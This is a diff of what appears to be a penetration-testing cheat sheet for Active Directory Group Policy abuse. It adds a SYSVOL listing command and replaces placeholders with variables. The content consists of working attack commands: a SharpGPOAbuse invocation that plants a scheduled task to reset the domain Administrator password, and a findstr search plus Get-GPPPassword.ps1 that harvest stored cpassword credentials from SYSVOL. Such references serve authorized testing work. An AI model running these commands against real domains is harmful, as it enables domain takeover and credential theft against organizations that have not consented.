@@ -276,11 +276,14 @@ Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn |
 
 #### <a name='shoot-gpo'></a>shoot-gpo
 ```
+# list sysvol
+ls \\$zdom_fqdn\SYSVOL\$zdom_fqdn\Policies\
+
 # SharpGPOAbuse
-SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author $zdom_fqdn\$ztarg_user_name --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
 
 # find cpassword
-findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+findstr /S /I cpassword \\$zdom_fqdn\sysvol\$zdom_fqdn\policies\*.xml
 Get-GPPPassword.ps1
 ```
 
